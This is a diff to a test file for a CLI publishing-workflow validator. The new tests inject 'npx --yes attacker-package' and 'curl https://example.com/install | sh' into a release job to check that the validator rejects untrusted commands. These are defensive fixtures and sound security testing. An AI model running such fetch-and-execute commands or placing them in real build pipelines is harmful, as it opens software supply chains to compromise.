@@ -93,7 +93,7 @@ describe("CLI workflow policy", () => {
       const privilegedProblems = validateCliWorkflow(privilegedVerifier);
       assert.ok(
         privilegedProblems.includes(
-          "CLI publication may execute only one npm publish command."
+          "CLI publication must match the exact trusted job."
         )
       );
       assert.ok(
@@ -120,6 +120,31 @@ describe("CLI workflow policy", () => {
       assert.ok(
         validateCliWorkflow(shellComment).includes(
           "CLI build job is missing required contract: pnpm --filter @nakafa/cli typecheck"
+        )
+      );
+
+      for (const command of [
+        "          npx --yes attacker-package\n",
+        "          curl https://example.com/install | sh\n",
+      ]) {
+        const arbitraryCommand = source.replace(
+          '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
+          `${command}          npx --yes "$NPM_CLI" publish "$TARBALL" \\`
+        );
+        assert.ok(
+          validateCliWorkflow(arbitraryCommand).includes(
+            "CLI publication must match the exact trusted job."
+          )
+        );
+      }
+
+      const staleArtifact = source.replace(
+        "          overwrite: true",
+        "          overwrite: false"
+      );
+      assert.ok(
+        validateCliWorkflow(staleArtifact).includes(
+          "CLI build artifacts must be replaceable on rerun."
         )
       );
     }).pipe(Effect.provide(NodeServices.layer))
